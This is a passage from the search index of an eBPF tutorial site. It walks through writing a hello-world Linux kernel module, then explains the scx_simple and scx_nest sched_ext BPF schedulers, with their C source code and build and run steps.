loaded into and unloaded from the kernel dynamically, without rebooting the system. Here\u2019s a simple step-by-step guide to help you write a basic kernel module:</p>"},{"location":"tutorials/43-kfuncs/module/#1-set-up-your-environment","title":"1. Set Up Your Environment","text":"<p>Make sure you have the Linux kernel headers installed and a suitable development environment ready. For Ubuntu or Debian, install them with:</p> <pre><code>sudo apt-get install linux-headers-$(uname -r) build-essential\n</code></pre>"},{"location":"tutorials/43-kfuncs/module/#2-write-the-kernel-module-code","title":"2. Write the Kernel Module Code","text":"<p>Here\u2019s an example of a very basic Linux kernel module:</p> <pre><code>// hello.c: A simple Linux kernel module\n#include &lt;linux/init.h&gt;    // Macros for module initialization\n#include &lt;linux/module.h&gt;  // Core header for loading modules\n#include &lt;linux/kernel.h&gt;  // Kernel logging macros\n\n// Function executed when the module is loaded\nstatic int __init hello_init(void)\n{\n    printk(KERN_INFO \"Hello, world!\\n\");\n    return 0;  // Return 0 if successful\n}\n\n// Function executed when the module is removed\nstatic void __exit hello_exit(void)\n{\n    printk(KERN_INFO \"Goodbye, world!\\n\");\n}\n\n// Macros to define the module\u2019s init and exit points\nmodule_init(hello_init);\nmodule_exit(hello_exit);\n\nMODULE_LICENSE(\"GPL\");               // License type (GPL)\nMODULE_AUTHOR(\"Your Name\");          // Module author\nMODULE_DESCRIPTION(\"A simple module\"); // Module description\nMODULE_VERSION(\"1.0\");               // Module version\n</code></pre>"},{"location":"tutorials/43-kfuncs/module/#3-create-a-makefile","title":"3. Create a Makefile","text":"<p>To compile the kernel module, you\u2019ll need a <code>Makefile</code>. Here's a simple one:</p> <pre><code>obj-m += hello.o  # hello.o is the target\n\nall:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\nclean:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n</code></pre>"},{"location":"tutorials/43-kfuncs/module/#4-compile-the-module","title":"4. Compile the Module","text":"<p>Run the following command in the directory where your <code>hello.c</code> and <code>Makefile</code> are located:</p> <pre><code>make\n</code></pre> <p>This will generate a file called <code>hello.ko</code>, which is the compiled kernel module.</p>"},{"location":"tutorials/43-kfuncs/module/#5-load-the-module","title":"5. Load the Module","text":"<p>To insert the module into the kernel, use <code>insmod</code>:</p> <pre><code>sudo insmod hello.ko\n</code></pre>"},{"location":"tutorials/43-kfuncs/module/#6-check-the-logs","title":"6. Check the Logs","text":"<p>To see the output from the <code>printk</code> statements, use the <code>dmesg</code> command:</p> <pre><code>dmesg | tail\n</code></pre> <p>You should see something like:</p> <pre><code>[ 1234.5678] Hello, world!\n</code></pre>"},{"location":"tutorials/43-kfuncs/module/#7-remove-the-module","title":"7. Remove the Module","text":"<p>To unload the module, use <code>rmmod</code>:</p> <pre><code>sudo rmmod hello\n</code></pre> <p>Again, check the logs using <code>dmesg</code>:</p> <pre><code>sudo dmesg | tail\n</code></pre> <p>You should see:</p> <pre><code>[ 1234.9876] Goodbye, world!\n</code></pre>"},{"location":"tutorials/43-kfuncs/module/#8-clean-up","title":"8. Clean Up","text":"<p>To clean up the build files, run:</p> <pre><code>make clean\n</code></pre>"},{"location":"tutorials/43-kfuncs/module/#notes","title":"Notes","text":"<ul> <li>License: The <code>MODULE_LICENSE(\"GPL\")</code> ensures the module is GPL-compliant, which allows it to use symbols (functions) exported by the kernel.</li> <li>Debugging: Use <code>printk</code> for logging within the module. It behaves similarly to <code>printf</code> but is designed for kernel space.</li> <li>Module Parameters: You can add parameters to modules using <code>module_param()</code> to pass arguments when the module is loaded.</li> </ul>"},{"location":"tutorials/43-kfuncs/module/#next-steps","title":"Next Steps","text":"<p>Once you are familiar with this basic example, you can explore:</p> <ul> <li>Writing more advanced modules that interact with hardware or the filesystem.</li> <li>Using kernel-specific APIs like work queues, kthreads, or handling interrupts.</li> <li>Diving into eBPF or loadable kernel module techniques for debugging and tracing kernel events.</li> </ul> <p>Share on  Share on </p>"},{"location":"tutorials/44-scx-simple/","title":"eBPF Tutorial: Introduction to the BPF Scheduler","text":"<p>Welcome to our deep dive into the world of eBPF with a focus on the BPF scheduler! If you're looking to extend your eBPF knowledge beyond the basics, you're in the right place. </p> <p>In this tutorial, we'll explore the scx_simple scheduler, a minimal example of the sched_ext scheduler class introduced in Linux kernel version <code>6.12</code>. We'll walk you through its architecture, how it leverages BPF programs to define scheduling behavior, and guide you through compiling and running the example. By the end, you'll have a solid understanding of how to create and manage advanced scheduling policies using eBPF.</p>"},{"location":"tutorials/44-scx-simple/#understanding-the-extensible-bpf-scheduler","title":"Understanding the Extensible BPF Scheduler","text":"<p>At the heart of this tutorial is the sched_ext scheduler class. Unlike traditional schedulers, sched_ext allows its behavior to be defined dynamically through a set of BPF programs, making it highly flexible and customizable. This means you can implement any scheduling algorithm on top of sched_ext, tailored to your specific needs.</p>"},{"location":"tutorials/44-scx-simple/#key-features-of-sched_ext","title":"Key Features of sched_ext","text":"<p>sched_ext offers flexible scheduling algorithms by allowing the implementation of any scheduling policy through BPF programs. It supports dynamic CPU grouping, enabling the BPF scheduler to group CPUs as needed without binding tasks to specific CPUs upon wakeup. The scheduler can be enabled or disabled at runtime without requiring a system reboot. In terms of system integrity, if the BPF scheduler encounters errors, the system gracefully reverts to the default scheduling behavior. Additionally, sched_ext provides comprehensive debugging support through the <code>sched_ext_dump</code> tracepoint and SysRq key sequences.</p> <p>With these features, sched_ext provides a robust foundation for experimenting with and deploying advanced scheduling strategies.</p>"},{"location":"tutorials/44-scx-simple/#introducing-scx_simple-a-minimal-sched_ext-scheduler","title":"Introducing scx_simple: A Minimal sched_ext Scheduler","text":"<p>The scx_simple scheduler is a straightforward example of a sched_ext scheduler in the Linux tools. It's designed to be easy to understand and serves as a foundation for more complex scheduling policies. scx_simple can operate in two modes: Global Weighted Virtual Time (vtime) Mode, which prioritizes tasks based on their virtual time, allowing for fair scheduling across different workloads, and FIFO (First-In-First-Out) Mode, a simple queue-based scheduling where tasks are executed in the order they arrive.</p> <p>scx_simple is particularly effective on single-socket CPUs with a uniform L3 cache topology. While the global FIFO mode can handle many workloads efficiently, it's essential to note that saturating threads might overshadow less active ones. Therefore, scx_simple is best suited for environments where a straightforward scheduling policy meets the performance and fairness requirements.</p> <p>While scx_simple is minimalistic, it can be deployed in production settings under the right conditions. It is best suited for systems with single-socket CPUs and uniform cache architectures. Additionally, it is ideal for workloads that don't require intricate scheduling policies and can benefit from simple FIFO or weighted vtime scheduling.</p>"},{"location":"tutorials/44-scx-simple/#into-the-code-kernel-and-user-space-analysis","title":"Into the Code: Kernel and User-Space Analysis","text":"<p>Let's explore how scx_simple is implemented both in the kernel and user-space. We'll start by presenting the complete code snippets and then break down their functionalities.</p>"},{"location":"tutorials/44-scx-simple/#kernel-side-implementation","title":"Kernel-Side Implementation","text":"<pre><code>#include &lt;scx/common.bpf.h&gt;\n\nchar _license[] SEC(\"license\") = \"GPL\";\n\nconst volatile bool fifo_sched;\n\nstatic u64 vtime_now;\nUEI_DEFINE(uei);\n\n/*\n * Built-in DSQs such as SCX_DSQ_GLOBAL cannot be used as priority queues\n * (meaning, cannot be dispatched to with scx_bpf_dispatch_vtime()). We\n * therefore create a separate DSQ with ID 0 that we dispatch to and consume\n * from. If scx_simple only supported global FIFO scheduling, then we could\n * just use SCX_DSQ_GLOBAL.\n */\n#define SHARED_DSQ 0\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);\n    __uint(key_size, sizeof(u32));\n    __uint(value_size, sizeof(u64));\n    __uint(max_entries, 2);   /* [local, global] */\n} stats SEC(\".maps\");\n\nstatic void stat_inc(u32 idx)\n{\n    u64 *cnt_p = bpf_map_lookup_elem(&amp;stats, &amp;idx);\n    if (cnt_p)\n        (*cnt_p)++;\n}\n\nstatic inline bool vtime_before(u64 a, u64 b)\n{\n    return (s64)(a - b) &lt; 0;\n}\n\ns32 BPF_STRUCT_OPS(simple_select_cpu, struct task_struct *p, s32 prev_cpu, u64 wake_flags)\n{\n    bool is_idle = false;\n    s32 cpu;\n\n    cpu = scx_bpf_select_cpu_dfl(p, prev_cpu, wake_flags, &amp;is_idle);\n    if (is_idle) {\n        stat_inc(0); /* count local queueing */\n        scx_bpf_dispatch(p, SCX_DSQ_LOCAL, SCX_SLICE_DFL, 0);\n    }\n\n    return cpu;\n}\n\nvoid BPF_STRUCT_OPS(simple_enqueue, struct task_struct *p, u64 enq_flags)\n{\n    stat_inc(1); /* count global queueing */\n\n    if (fifo_sched) {\n        scx_bpf_dispatch(p, SHARED_DSQ, SCX_SLICE_DFL, enq_flags);\n    } else {\n        u64 vtime = p-&gt;scx.dsq_vtime;\n\n        /*\n         * Limit the amount of budget that an idling task can accumulate\n         * to one slice.\n         */\n        if (vtime_before(vtime, vtime_now - SCX_SLICE_DFL))\n            vtime = vtime_now - SCX_SLICE_DFL;\n\n        scx_bpf_dispatch_vtime(p, SHARED_DSQ, SCX_SLICE_DFL, vtime,\n                       enq_flags);\n    }\n}\n\nvoid BPF_STRUCT_OPS(simple_dispatch, s32 cpu, struct task_struct *prev)\n{\n    scx_bpf_consume(SHARED_DSQ);\n}\n\nvoid BPF_STRUCT_OPS(simple_running, struct task_struct *p)\n{\n    if (fifo_sched)\n        return;\n\n    /*\n     * Global vtime always progresses forward as tasks start executing. The\n     * test and update can be performed concurrently from multiple CPUs and\n     * thus racy. Any error should be contained and temporary. Let's just\n     * live with it.\n     */\n    if (vtime_before(vtime_now, p-&gt;scx.dsq_vtime))\n        vtime_now = p-&gt;scx.dsq_vtime;\n}\n\nvoid BPF_STRUCT_OPS(simple_stopping, struct task_struct *p, bool runnable)\n{\n    if (fifo_sched)\n        return;\n\n    /*\n     * Scale the execution time by the inverse of the weight and charge.\n     *\n     * Note that the default yield implementation yields by setting\n     * @p-&gt;scx.slice to zero and the following would treat the yielding task\n     * as if it has consumed all its slice. If this penalizes yielding tasks\n     * too much, determine the execution time by taking explicit timestamps\n     * instead of depending on @p-&gt;scx.slice.\n     */\n    p-&gt;scx.dsq_vtime += (SCX_SLICE_DFL - p-&gt;scx.slice) * 100 / p-&gt;scx.weight;\n}\n\nvoid BPF_STRUCT_OPS(simple_enable, struct task_struct *p)\n{\n    p-&gt;scx.dsq_vtime = vtime_now;\n}\n\ns32 BPF_STRUCT_OPS_SLEEPABLE(simple_init)\n{\n    return scx_bpf_create_dsq(SHARED_DSQ, -1);\n}\n\nvoid BPF_STRUCT_OPS(simple_exit, struct scx_exit_info *ei)\n{\n    UEI_RECORD(uei, ei);\n}\n\nSCX_OPS_DEFINE(simple_ops,\n           .select_cpu  = (void *)simple_select_cpu,\n           .enqueue   = (void *)simple_enqueue,\n           .dispatch  = (void *)simple_dispatch,\n           .running   = (void *)simple_running,\n           .stopping  = (void *)simple_stopping,\n           .enable   = (void *)simple_enable,\n           .init   = (void *)simple_init,\n           .exit   = (void *)simple_exit,\n           .name   = \"simple\");\n</code></pre>"},{"location":"tutorials/44-scx-simple/#kernel-side-breakdown","title":"Kernel-Side Breakdown","text":"<p>The kernel-side implementation of scx_simple defines how tasks are selected, enqueued, dispatched, and managed. Here's a high-level overview:</p> <p>Initialization and Licensing: The scheduler is licensed under GPL. A global variable <code>fifo_sched</code> determines the scheduling mode (FIFO or weighted vtime).</p> <p>Dispatch Queue (DSQ) Management: A shared DSQ (<code>SHARED_DSQ</code>) with ID 0 is created to handle task dispatching. A <code>stats</code> map tracks the number of tasks queued locally and globally.</p> <p>CPU Selection (<code>simple_select_cpu</code>): This function selects the CPU for a waking task. If the selected CPU is idle, the task is immediately dispatched to the local DSQ.</p> <p>Task Enqueueing (<code>simple_enqueue</code>): Depending on the <code>fifo_sched</code> flag, tasks are either dispatched to the shared DSQ in FIFO mode or to a priority queue based on virtual time. Virtual time (<code>vtime</code>) ensures fair scheduling by accounting for task execution time and weight.</p> <p>Task Dispatching (<code>simple_dispatch</code>): This function consumes tasks from the shared DSQ and assigns them to CPUs.</p> <p>Running and Stopping Tasks (<code>simple_running</code> &amp; <code>simple_stopping</code>): These functions manage the progression of virtual time for tasks, ensuring that scheduling decisions remain fair and balanced.</p> <p>Enabling and Exiting: Handles the enabling of the scheduler and records exit information for debugging.</p> <p>This modular structure allows scx_simple to be both simple and effective, providing a clear example of how to implement custom scheduling policies using eBPF.</p>"},{"location":"tutorials/44-scx-simple/#user-space-implementation","title":"User-Space Implementation","text":"<pre><code>static void read_stats(struct scx_simple *skel, __u64 *stats)\n{\n    int nr_cpus = libbpf_num_possible_cpus();\n    __u64 cnts[2][nr_cpus];\n    __u32 idx;\n\n    memset(stats, 0, sizeof(stats[0]) * 2);\n\n    for (idx = 0; idx &lt; 2; idx++) {\n        int ret, cpu;\n\n        ret = bpf_map_lookup_elem(bpf_map__fd(skel-&gt;maps.stats),\n                      &amp;idx, cnts[idx]);\n        if (ret &lt; 0)\n            continue;\n        for (cpu = 0; cpu &lt; nr_cpus; cpu++)\n            stats[idx] += cnts[idx][cpu];\n    }\n}\n\nint main(int argc, char **argv)\n{\n    struct scx_simple *skel;\n    struct bpf_link *link;\n    __u32 opt;\n    __u64 ecode;\n\n    libbpf_set_print(libbpf_print_fn);\n    signal(SIGINT, sigint_handler);\n    signal(SIGTERM, sigint_handler);\nrestart:\n    skel = SCX_OPS_OPEN(simple_ops, scx_simple);\n\n    while ((opt = getopt(argc, argv, \"fvh\")) != -1) {\n        switch (opt) {\n        case 'f':\n            skel-&gt;rodata-&gt;fifo_sched = true;\n            break;\n        case 'v':\n            verbose = true;\n            break;\n        default:\n            fprintf(stderr, help_fmt, basename(argv[0]));\n            return opt != 'h';\n        }\n    }\n\n    SCX_OPS_LOAD(skel, simple_ops, scx_simple, uei);\n    link = SCX_OPS_ATTACH(skel, simple_ops, scx_simple);\n\n    while (!exit_req &amp;&amp; !UEI_EXITED(skel, uei)) {\n        __u64 stats[2];\n\n        read_stats(skel, stats);\n        printf(\"local=%llu global=%llu\\n\", stats[0], stats[1]);\n        fflush(stdout);\n        sleep(1);\n    }\n\n    bpf_link__destroy(link);\n    ecode = UEI_REPORT(skel, uei);\n    scx_simple__destroy(skel);\n\n    if (UEI_ECODE_RESTART(ecode))\n        goto restart;\n    return 0;\n}\n</code></pre> <p>The complete code can be found in https://github.com/eunomia-bpf/bpf-developer-tutorial</p>"},{"location":"tutorials/44-scx-simple/#user-space-breakdown","title":"User-Space Breakdown","text":"<p>The user-space component is responsible for interacting with the BPF scheduler, managing its lifecycle, and monitoring its performance.</p> <p>Statistics Collection (<code>read_stats</code>): This function reads the number of tasks queued locally and globally from the BPF maps and aggregates statistics across all CPUs for reporting.</p> <p>Main Function Workflow: The main function sets up libbpf, handles signal interrupts, and opens the scx_simple BPF skeleton. It processes command-line options to toggle FIFO scheduling and verbosity, loads the BPF program, and attaches it to the scheduler. The program enters a monitoring loop where it continuously reads and prints scheduling statistics every second. Upon termination, it cleans up by destroying BPF links and handling potential restarts based on exit codes.</p> <p>This user-space program provides a straightforward interface to monitor and control the scx_simple scheduler, making it easier to understand its behavior in real-time.</p>"},{"location":"tutorials/44-scx-simple/#deep-dive-into-key-concepts","title":"Deep Dive into Key Concepts","text":"<p>To fully grasp how scx_simple operates, let's explore some of the underlying concepts and mechanisms.</p>"},{"location":"tutorials/44-scx-simple/#dispatch-queues-dsqs","title":"Dispatch Queues (DSQs)","text":"<p>DSQs are central to sched_ext's operation, acting as buffers where tasks are queued before being dispatched to CPUs. They can function as either FIFO queues or priority queues based on virtual time.</p> <p>Local DSQs (<code>SCX_DSQ_LOCAL</code>) ensure that each CPU has its own queue, allowing tasks to be dispatched and consumed efficiently without contention. The Global DSQ (<code>SCX_DSQ_GLOBAL</code>) serves as a shared queue where tasks from all CPUs can be queued, providing a fallback when local queues are empty. Developers can also create custom DSQs using <code>scx_bpf_create_dsq()</code> for more specialized scheduling needs.</p>"},{"location":"tutorials/44-scx-simple/#virtual-time-vtime","title":"Virtual Time (vtime)","text":"<p>Virtual time is a mechanism to ensure fairness in scheduling by tracking how much time a task has consumed relative to its weight. In scx_simple's weighted vtime mode, tasks with higher weights consume virtual time more slowly, allowing lower-weighted tasks to run more frequently.</p>"},{"location":"tutorials/44-scx-simple/#scheduling-cycle","title":"Scheduling Cycle","text":"<p>Understanding the scheduling cycle is crucial for modifying or extending scx_simple. The following steps detail how a waking task is scheduled and executed:</p> <p>Task Wakeup and CPU Selection: When a task wakes up, <code>ops.select_cpu()</code> is invoked. This function provides a suggested CPU for the task to run on and can wake up idle CPUs to prepare them for task execution. If the selected CPU is idle, the task is immediately dispatched to the local DSQ, potentially reducing scheduling latency.</p> <p>Immediate Dispatch from <code>ops.select_cpu()</code>: A task can be dispatched directly to a Dispatch Queue (DSQ) from <code>ops.select_cpu()</code>. If dispatched to <code>SCX_DSQ_LOCAL</code>, the task is placed in the local DSQ of the selected CPU, skipping the <code>ops.enqueue()</code> callback.</p> <p>Task Enqueueing (<code>ops.enqueue()</code>): If the task was not dispatched in the previous step, <code>ops.enqueue()</code> is invoked. This function can dispatch the task to the global DSQ, a local DSQ, or a custom DSQ based on the <code>fifo_sched</code> flag and virtual time calculations.</p> <p>CPU Scheduling Readiness: When a CPU is ready to schedule, it first checks its local DSQ for tasks. If the local DSQ is empty, it checks the global DSQ. If no tasks are found, <code>ops.dispatch()</code> is invoked to populate the local DSQ. After dispatching, if tasks are available in the local DSQ, the CPU executes the first one. If not, it may attempt to consume a task from the global DSQ or go idle.</p> <p>This scheduling cycle ensures that tasks are scheduled efficiently while maintaining fairness and responsiveness. By understanding each step, developers can modify or extend scx_simple to implement custom scheduling behaviors that meet specific requirements.</p>"},{"location":"tutorials/44-scx-simple/#compiling-and-running-scx_simple","title":"Compiling and Running scx_simple","text":"<p>Getting scx_simple up and running involves setting up the necessary toolchain and configuring the kernel appropriately. Here's how you can compile and execute the example scheduler.</p>"},{"location":"tutorials/44-scx-simple/#toolchain-dependencies","title":"Toolchain Dependencies","text":"<p>Before compiling scx_simple, ensure you have the following tools installed:</p> <ul> <li>clang &gt;= 16.0.0: Required for compiling BPF programs. GCC is working on BPF support but lacks essential features like BTF type tags necessary for certain functionalities.</li> <li>pahole &gt;= 1.25: Used to generate BTF from DWARF, crucial for type information in BPF programs.</li> <li>rust &gt;= 1.70.0: If you're working with Rust-based schedulers, ensure you have the appropriate Rust toolchain version.</li> </ul> <p>Additionally, tools like <code>make</code> are required for building the examples.</p>"},{"location":"tutorials/44-scx-simple/#kernel-configuration","title":"Kernel Configuration","text":"<p>To enable and use sched_ext, ensure the following kernel configuration options are set:</p> <pre><code>CONFIG_BPF=y\nCONFIG_SCHED_CLASS_EXT=y\nCONFIG_BPF_SYSCALL=y\nCONFIG_BPF_JIT=y\nCONFIG_DEBUG_INFO_BTF=y\nCONFIG_BPF_JIT_ALWAYS_ON=y\nCONFIG_BPF_JIT_DEFAULT_ON=y\nCONFIG_PAHOLE_HAS_SPLIT_BTF=y\nCONFIG_PAHOLE_HAS_BTF_TAG=y\n</code></pre> <p>These configurations enable the necessary features for BPF scheduling and ensure that sched_ext operates correctly.</p>"},{"location":"tutorials/44-scx-simple/#building-scx_simple","title":"Building scx_simple","text":"<p>Navigate to the kernel's <code>tools/sched_ext/</code> directory and run:</p> <pre><code>make\n</code></pre> <p>This command compiles the scx_simple scheduler along with its dependencies.</p>"},{"location":"tutorials/44-scx-simple/#running-scx_simple","title":"Running scx_simple","text":"<p>Once compiled, execute the user-space program to load and monitor the scheduler:</p> <pre><code>./scx_simple -f\n</code></pre> <p>The <code>-f</code> flag enables FIFO scheduling mode. You can also use <code>-v</code> for verbose output or <code>-h</code> for help.</p> <p>As the program runs, it will display the number of tasks queued locally and globally every second:</p> <pre><code>local=123 global=456\nlocal=124 global=457\n...\n</code></pre>"},{"location":"tutorials/44-scx-simple/#switching-between-sched_ext-and-cfs","title":"Switching Between sched_ext and CFS","text":"<p>sched_ext operates alongside the default Completely Fair Scheduler (CFS). You can switch between sched_ext and CFS dynamically. To enable sched_ext, load the BPF scheduler using scx_simple. To disable sched_ext, terminate the scx_simple program, reverting all tasks back to CFS. Additionally, using SysRq key sequences like <code>SysRq-S</code> can help manage the scheduler's state and trigger debug dumps with <code>SysRq-D</code>.</p>"},{"location":"tutorials/44-scx-simple/#summary-and-next-steps","title":"Summary and Next Steps","text":"<p>In this tutorial, we've introduced the sched_ext scheduler class and walked through a minimal example, scx_simple, demonstrating how to define custom scheduling behaviors using eBPF programs. We've covered the architecture, key concepts like DSQs and virtual time, and provided step-by-step instructions for compiling and running the scheduler.</p> <p>By mastering scx_simple, you're well-equipped to design and implement more sophisticated scheduling policies tailored to your specific requirements. Whether you're optimizing for performance, fairness, or specific workload characteristics, sched_ext and eBPF offer the flexibility and power to achieve your goals.</p> <p>Ready to take your eBPF skills to the next level? Dive deeper into our tutorials and explore more examples by visiting our tutorial repository or our website.</p>"},{"location":"tutorials/44-scx-simple/#references","title":"References","text":"<ul> <li>sched_ext Repository: https://github.com/sched-ext/scx</li> <li>Linux Kernel Documentation: Scheduler Ext Documentation</li> <li>Kernel Source Tree: Linux Kernel sched_ext Tools</li> <li>eBPF Official Documentation: https://ebpf.io/docs/</li> <li>libbpf Documentation: https://github.com/libbpf/libbpf</li> </ul> <p>Feel free to explore these resources to expand your understanding and continue your journey into advanced eBPF programming!</p> <p>Share on  Share on </p>"},{"location":"tutorials/45-scx-nest/","title":"eBPF Tutorial by Example: Implementing the <code>scx_nest</code> Scheduler","text":"<p>In the ever-evolving landscape of system performance optimization, the ability to customize and extend kernel behavior is invaluable. One of the most powerful tools for achieving this is eBPF (extended Berkeley Packet Filter). In this tutorial, we'll explore the implementation of the <code>scx_nest</code> scheduler, an advanced eBPF program that leverages the <code>sched_ext</code> scheduler class introduced in Linux kernel version <code>6.12</code>. By the end of this guide, you'll understand how to build a sophisticated scheduler that dynamically adjusts task placement based on CPU core frequencies and utilization.</p>"},{"location":"tutorials/45-scx-nest/#introduction-to-sched_ext","title":"Introduction to <code>sched_ext</code>","text":"<p>The <code>sched_ext</code> scheduler class marks a significant advancement in Linux kernel scheduling capabilities. Unlike traditional schedulers, <code>sched_ext</code> allows its behavior to be defined dynamically through a set of BPF (Berkeley Packet Filter) programs. This flexibility enables developers to implement custom scheduling algorithms tailored to specific workloads and system requirements.</p>"},{"location":"tutorials/45-scx-nest/#understanding-the-scx_nest-scheduler","title":"Understanding the <code>scx_nest</code> Scheduler","text":""},{"location":"tutorials/45-scx-nest/#overview","title":"Overview","text":"<p>The <code>scx_nest</code> scheduler is inspired by the Inria Paris paper titled \"OS Scheduling with Nest: Keeping Tasks Close Together on Warm Cores.\" Developed by Meta Platforms, Inc., <code>scx_nest</code> focuses on encouraging task placement on CPU cores that are likely to run at higher frequencies based on recent usage patterns. This approach aims to optimize performance by ensuring that tasks execute on the most efficient cores available.</p> <p>The scheduler operates as a global weighted virtual time (vtime) scheduler, similar to the Completely Fair Scheduler (CFS), while utilizing the Nest algorithm to select idle cores during task wakeup. This dual strategy ensures that tasks are not only fairly distributed but also placed on cores that can execute them most effectively.</p> <p><code>scx_nest</code> is designed to optimize workloads with relatively low CPU utilization that can benefit from running on a subset of cores. By concentrating tasks on fewer cores, the scheduler helps maintain high frequencies on those cores, enhancing performance. However, for workloads that perform better when distributed across many cores to avoid cache thrashing, <code>scx_nest</code> may not be the ideal choice. Evaluating the suitability of <code>scx_nest</code> for a specific workload often requires experimentation.</p> <p>Given its design, <code>scx_nest</code> is suitable for production environments, provided the hardware constraints are met. It performs optimally on single CCX (Core Complex) or single-socket hosts with a uniform L3 cache topology. While preemption is not implemented in the current version, the shared scheduling queue across all CPUs ensures that tasks at the front of the queue are executed promptly, provided there are enough CPUs available.</p>"},{"location":"tutorials/45-scx-nest/#high-level-code-analysis","title":"High-Level Code Analysis","text":"<p>The <code>scx_nest</code> scheduler's implementation is intricate, involving various data structures, maps, and functions that work in harmony to manage task placement and CPU core utilization. The complete source code is available in the eunomia-bpf/bpf-developer-tutorial repository. Below, we'll dissect the core components of the scheduler, explaining each part in detail.</p>"},{"location":"tutorials/45-scx-nest/#core-data-structures-and-maps","title":"Core Data Structures and Maps","text":""},{"location":"tutorials/45-scx-nest/#task-context-task_ctx","title":"Task Context (<code>task_ctx</code>)","text":"<p>Each task in the system has an associated context that maintains scheduling-related information. This context is crucial for making informed scheduling decisions based on the task's history and current state.</p> <pre><code>/* Per-task scheduling context */\nstruct task_ctx {\n    /*\n     * A temporary cpumask for calculating a task's primary and reserve\n     * mask.\n     */\n    struct bpf_cpumask __kptr *tmp_mask;\n\n    /*\n     * The number of times that a task observes that its previous core is\n     * not idle. If this occurs r_impatient times in a row, a core is\n     * attempted to be retrieved from either the reserve nest, or the\n     * fallback nest.\n     */\n    u32 prev_misses;\n\n    /*\n     * A core that the task is \"attached\" to, meaning the last core that it\n     * executed on at least twice in a row, and the core that it first\n     * tries to migrate to on wakeup. The task only migrates to the\n     * attached core if it is idle and in the primary nest.\n     */\n    s32 attached_core;\n\n    /*\n     * The last core that the task executed on. This is used to determine\n     * if the task should attach to the core that it will execute on next.\n     */\n    s32 prev_cpu;\n};\n</code></pre> <p>The <code>task_ctx</code> structure holds a temporary CPU mask (<code>tmp_mask</code>) used for calculating the task's primary and reserve CPU sets. The <code>prev_misses</code> counter tracks how often the task's preferred core was not idle, influencing decisions to migrate the task to different cores. The <code>attached_core</code> indicates the core the task is currently bound to, ensuring it runs on a high-frequency core when possible. Lastly, <code>prev_cpu</code> records the last core the task executed on, aiding in maintaining task-core affinity.</p>"},{"location":"tutorials/45-scx-nest/#per-cpu-context-pcpu_ctx","title":"Per-CPU Context (<code>pcpu_ctx</code>)","text":"<p>Each CPU has an associated context that manages timers and compaction state. This context helps in determining when a core should be demoted from the primary nest due to inactivity.</p> <pre><code>struct pcpu_ctx {\n    /* The timer used to compact the core from the primary nest. */\n    struct bpf_timer timer;\n\n    /* Whether the current core has been scheduled for compaction. */\n    bool scheduled_compaction;\n};\n</code></pre> <p>The <code>pcpu_ctx</code> structure contains a <code>bpf_timer</code> used to schedule compaction events and a boolean flag <code>scheduled_compaction</code> indicating whether a compaction has been scheduled for the core.</p>"},{"location":"tutorials/45-scx-nest/#maps","title":"Maps","text":"<p>Several BPF maps are utilized to store contexts and manage timers:</p> <pre><code>/* Task storage map */\nstruct {\n    __uint(type, BPF_MAP_TYPE_TASK_STORAGE);\n    __uint(map_flags, BPF_F_NO_PREALLOC);\n    __type(key, int);\n    __type(value, struct task_ctx);\n} task_ctx_stor SEC(\".maps\");\n\n/* Per-CPU contexts */\nstruct {\n    __uint(type, BPF_MAP_TYPE_ARRAY);\n    __uint(max_entries, 1024);\n    __type(key, s32);\n    __type(value, struct pcpu_ctx);\n} pcpu_ctxs SEC(\".maps\");\n\n/* Statistics timer */\nstruct {\n    __uint(type, BPF_MAP_TYPE_ARRAY);\n    __uint(max_entries, 1);\n    __type(key, u32);\n    __type(value, struct stats_timer);\n} stats_timer SEC(\".maps\");\n</code></pre> <ul> <li><code>task_ctx_stor</code>: This map stores the scheduling context for each task, enabling the scheduler to access and modify task-specific information.</li> <li><code>pcpu_ctxs</code>: An array map that holds the per-CPU contexts, allowing the scheduler to manage timers and compaction states for each CPU.</li> <li><code>stats_timer</code>: A single-entry array map used to manage a central timer for collecting scheduling statistics.</li> </ul> <p>Additionally, the scheduler maintains masks for primary, reserved, other, and idle CPUs, as well as a statistics map to track various scheduler metrics.</p>"},{"location":"tutorials/45-scx-nest/#core-functions","title":"Core Functions","text":""},{"location":"tutorials/45-scx-nest/#stat_inc","title":"<code>stat_inc</code>","text":"<p>A helper function to increment scheduler statistics:</p> <pre><code>static __always_inline void stat_inc(u32 idx)\n{\n    u64 *cnt_p = bpf_map_lookup_elem(&amp;stats, &amp;idx);\n    if (cnt_p)\n        (*cnt_p)++;\n}\n</code></pre> <p>This function looks up a counter in the <code>stats</code> map and increments it if the counter exists. It's used throughout the scheduler to track various events and states.</p>"},{"location":"tutorials/45-scx-nest/#vtime_before","title":"<code>vtime_before</code>","text":"<p>A utility function to compare virtual times:</p> <pre><code>static inline bool vtime_before(u64 a, u64 b)\n{\n    return (s64)(a - b) &lt; 0;\n}\n</code></pre> <p>This function determines if virtual time <code>a</code> is before <code>b</code>, facilitating time-based scheduling decisions.</p>"},{"location":"tutorials/45-scx-nest/#try_make_core_reserved","title":"<code>try_make_core_reserved</code>","text":"<p>Attempts to promote a core to the reserved nest:</p> <pre><code>static __always_inline void\ntry_make_core_reserved(s32 cpu, struct bpf_cpumask * reserved, bool promotion)\n{\n    s32 tmp_nr_reserved;\n\n    /*\n     * This check is racy, but that's OK. If we incorrectly fail to promote\n     * a core to reserve, it's because another context added or removed a\n     * core from reserved in this small window. It will balance out over\n     * subsequent wakeups.\n     */\n    tmp_nr_reserved = nr_reserved;\n    if (tmp_nr_reserved &lt; r_max) {\n        /*\n         * It's possible that we could exceed r_max for a time here,\n         * but that should balance out as more cores are either demoted\n         * or fail to be promoted into the reserve nest.\n         */\n        __sync_fetch_and_add(&amp;nr_reserved, 1);\n        bpf_cpumask_set_cpu(cpu, reserved);\n        if (promotion)\n            stat_inc(NEST_STAT(PROMOTED_TO_RESERVED));\n        else\n            stat_inc(NEST_STAT(DEMOTED_TO_RESERVED));\n    } else {\n        bpf_cpumask_clear_cpu(cpu, reserved);\n        stat_inc(NEST_STAT(RESERVED_AT_CAPACITY));\n    }\n}\n</code></pre> <p>The <code>try_make_core_reserved</code> function attempts to add a CPU core to the reserved mask. It first checks if the number of reserved cores (<code>nr_reserved</code>) is below the maximum allowed (<code>r_max</code>). If so, it increments the <code>nr_reserved</code> counter and adds the core to the reserved mask. Depending on whether the core is being promoted or demoted, it increments the corresponding statistic. If the reserved capacity is full, it clears the core from the reserved mask and updates the relevant 